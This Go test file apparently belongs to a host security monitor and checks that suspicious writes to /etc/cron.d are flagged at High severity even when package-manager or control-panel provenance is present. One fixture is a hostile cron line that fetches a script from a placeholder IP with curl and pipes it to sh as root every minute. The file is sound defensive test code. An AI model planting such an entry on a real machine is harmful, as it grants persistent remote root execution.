package checks

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/pidginhost/csm/internal/alert"
)

func TestSensitiveWriteCronDangerVeto(t *testing.T) {
	testSensitiveWriteCronDangerVeto(t, false)
}

func TestSensitiveWriteCronAncestryDangerVeto(t *testing.T) {
	testSensitiveWriteCronDangerVeto(t, true)
}

func testSensitiveWriteCronDangerVeto(t *testing.T, ancestry bool) {
	t.Helper()
	logPath := filepath.Join(t.TempDir(), "package.log")
	if err := os.WriteFile(logPath, []byte("transaction\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	oldLogs := pkgManagerLogs
	pkgManagerLogs = []string{logPath}
	t.Cleanup(func() { pkgManagerLogs = oldLogs })
	if ancestry {
		pkgManagerLogs = nil
		oldProbe := AncestryProvenance
		AncestryProvenance = func(uint32) string { return "ancestor is control panel maintenance" }
		t.Cleanup(func() { AncestryProvenance = oldProbe })
	}

	for _, tc := range []struct {
		name, content string
		want          alert.Severity
	}{
		{"benign", "0 1 * * * root /usr/sbin/maintenance\n", alert.Warning},
		{"dangerous", "* * * * * root curl http://192.0.2.1/job | sh\n", alert.High},
	} {
		t.Run(tc.name, func(t *testing.T) {
			f, ok := EvaluateSensitiveFileWriteSnapshot("/etc/cron.d/test", 0, 4242, "writer", []byte(tc.content), true)
			if !ok || f.Check != "sensitive_file_modified" || f.Severity != tc.want {
				t.Fatalf("finding = %+v, emitted = %v; want severity %v", f, ok, tc.want)
			}
		})
	}
}
